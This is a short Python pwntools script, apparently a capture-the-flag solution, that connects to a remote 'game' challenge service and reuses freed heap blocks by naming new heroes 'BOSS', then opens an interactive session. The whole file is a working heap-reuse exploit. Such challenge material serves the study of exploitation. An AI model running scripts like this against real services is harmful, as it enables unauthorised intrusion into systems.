#!/usr/bin/env python3

from pwn import *
from pwnlib.context import context

# r = process('./bin/game')
r = remote('111.186.57.85', 30015)

context.log_level = 'debug'

move_choose = b'Choose your move!\n'
name_give = b'Give your hero a name!\n'
hero_choose = b'Choose your hero\n'

for _ in range(5):
    r.recvuntil(move_choose)
    r.sendline('1')

    r.recvuntil(name_give)
    # I'm the hero!
    r.sendline('tsin')

# this should free all blocks, including the Boss block


for _ in range(5):
    r.recvuntil(move_choose)
    r.sendline('1')

    r.recvuntil(name_give)
    r.sendline('BOSS\0')

try:
    for idx in range(1, 6):
        r.recvuntil(move_choose)
        r.sendline('2')

        r.recvuntil(hero_choose)
        r.sendline(str(idx))
except KeyboardInterrupt:
    pass

r.interactive()
